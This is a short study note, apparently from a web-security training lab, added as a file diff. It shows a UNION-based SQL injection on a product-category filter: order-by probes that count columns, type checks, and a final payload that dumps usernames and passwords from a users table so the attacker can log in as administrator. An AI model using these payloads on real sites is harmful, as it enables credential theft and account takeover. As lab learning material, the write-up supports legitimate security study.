@@ -1,0 +1,29 @@
+SQL Injection: product category:
+
+End goal: output the username and password in the users table and logina as administrator
+
+Analysis:
+----------
+
+to do union and select from another table the no of cloumn should be same and the data type should be same
+
+1. Determine the no of comumn:
+
+	' order by 1--
+	' order by 2--
+	' order by 3--    --> internal server error
+
+no of col = 3-1 = 2
+
+
+
+2. Determine data type of columns:
+
+	' union select 'a', NULL--
+	' union select NULL, 'a'--
+
+	---> both are string type since both didnt give error
+
+3. To display username and password from users table:
+
+	' union select username, password from users--
